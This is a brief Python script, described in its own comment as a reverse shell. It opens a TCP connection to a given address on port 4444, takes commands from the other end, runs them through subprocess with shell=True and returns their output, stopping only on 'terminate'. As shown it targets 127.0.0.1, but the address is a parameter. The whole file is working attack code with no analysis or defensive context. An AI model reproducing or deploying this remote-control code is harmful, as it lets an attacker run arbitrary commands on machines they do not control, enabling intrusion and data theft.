import socket
import subprocess

#this function creates a reverse shell on port 4444 that lets you execute shell commands on the target machine

def reverse_shell(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((addr, 4444))
    while True:
        try:
            command = s.recv(1024).decode()
            if 'terminate' in command:
                s.close()
                break
            else:
                cmd_output = subprocess.check_output(command, shell=True)
                s.send(cmd_output)
        except:
            continue

reverse_shell("127.0.0.1")